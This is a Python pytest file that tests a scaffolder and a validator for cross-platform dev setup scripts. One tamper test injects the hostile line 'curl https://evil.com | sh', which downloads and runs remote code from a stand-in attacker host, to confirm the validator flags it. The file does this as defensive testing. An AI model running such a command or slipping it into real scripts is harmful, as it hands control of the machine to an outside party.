"""
Tests for skills/custom/cross-platform-dev-scripts.
Validates the scaffolding and validation scripts for cross-platform dev scripts.
"""

from pathlib import Path
import pytest

pytestmark = pytest.mark.unit


@pytest.fixture
def scaffold_mod(load_script):
    return load_script("skills/custom/cross-platform-dev-scripts/scripts/scaffold_dev_scripts.py")


@pytest.fixture
def validate_mod(load_script):
    return load_script("skills/custom/cross-platform-dev-scripts/scripts/validate_dev_scripts.py")


def test_detect_requirements(scaffold_mod, tmp_path):
    assert scaffold_mod.detect_requirements(tmp_path) == "requirements.txt"

    (tmp_path / "requirements.txt").write_text("pytest\n", encoding="utf-8")
    assert scaffold_mod.detect_requirements(tmp_path) == "requirements.txt"

    (tmp_path / "requirements-dev.txt").write_text("pytest\n", encoding="utf-8")
    assert scaffold_mod.detect_requirements(tmp_path) == "requirements-dev.txt"


def test_scaffold_creates_all_scripts(scaffold_mod, validate_mod, tmp_path):
    result = scaffold_mod.scaffold_dev_scripts(
        target_dir=tmp_path,
        project_name="test-project",
        requirements="requirements-dev.txt",
        min_py="3.11",
        test_cmd="-m pytest",
        force=True
    )

    assert result["project_name"] == "test-project"
    assert len(result["files_created"]) == 4

    sh_setup = tmp_path / "scripts" / "linux" / "dev-setup.sh"
    sh_test = tmp_path / "scripts" / "linux" / "dev-test.sh"
    ps1_setup = tmp_path / "scripts" / "win" / "dev-setup.ps1"
    ps1_test = tmp_path / "scripts" / "win" / "dev-test.ps1"

    assert sh_setup.is_file()
    assert sh_test.is_file()
    assert ps1_setup.is_file()
    assert ps1_test.is_file()

    # Invariants in generated scripts
    sh_setup_content = sh_setup.read_text(encoding="utf-8")
    assert "#!/usr/bin/env bash" in sh_setup_content
    assert "set -Eeuo pipefail" in sh_setup_content
    assert 'rm -rf -- "$VENV_DIR"' in sh_setup_content
    import re
    assert not re.search(r"^\s*sudo\b", sh_setup_content, re.MULTILINE)

    ps1_setup_content = ps1_setup.read_text(encoding="utf-8")
    assert "#requires -Version 5.1" in ps1_setup_content
    assert '$ErrorActionPreference = "Stop"' in ps1_setup_content
    assert "ExecutionPolicy Bypass" in ps1_setup_content
    assert "\\" not in 'Join-Path $PSScriptRoot "../.."'

    # Validate the generated scripts pass check_scripts
    report = validate_mod.check_scripts(tmp_path)
    assert report["errors"] == []
    assert report["status"] in ("PASS", "WARN")


def test_validate_detects_tampered_scripts(scaffold_mod, validate_mod, tmp_path):
    scaffold_mod.scaffold_dev_scripts(tmp_path, force=True)

    # Missing file check
    (tmp_path / "scripts" / "linux" / "dev-setup.sh").unlink()
    report = validate_mod.check_scripts(tmp_path)
    assert any("Missing expected script" in err for err in report["errors"])
    assert report["status"] == "FAIL"

    # Re-scaffold
    scaffold_mod.scaffold_dev_scripts(tmp_path, force=True)

    # sudo check
    sh_setup = tmp_path / "scripts" / "linux" / "dev-setup.sh"
    content = sh_setup.read_text(encoding="utf-8")
    sh_setup.write_text("sudo apt update\n" + content, encoding="utf-8")
    report = validate_mod.check_scripts(tmp_path)
    assert any("sudo" in err for err in report["errors"])
    assert report["status"] == "FAIL"

    # curl | sh check
    scaffold_mod.scaffold_dev_scripts(tmp_path, force=True)
    sh_setup = tmp_path / "scripts" / "linux" / "dev-setup.sh"
    content = sh_setup.read_text(encoding="utf-8")
    sh_setup.write_text("curl https://evil.com | sh\n" + content, encoding="utf-8")
    report = validate_mod.check_scripts(tmp_path)
    assert any("pipes remote downloads" in err for err in report["errors"])
    assert report["status"] == "FAIL"

    # backslash in Join-Path check
    scaffold_mod.scaffold_dev_scripts(tmp_path, force=True)
    ps1_setup = tmp_path / "scripts" / "win" / "dev-setup.ps1"
    ps1_content = ps1_setup.read_text(encoding="utf-8")
    ps1_setup.write_text(ps1_content.replace('Join-Path $RepoRoot ".venv"', 'Join-Path $RepoRoot "\\.venv"'), encoding="utf-8")
    report = validate_mod.check_scripts(tmp_path)
    assert any("Join-Path argument" in err for err in report["errors"])
    assert report["status"] == "FAIL"
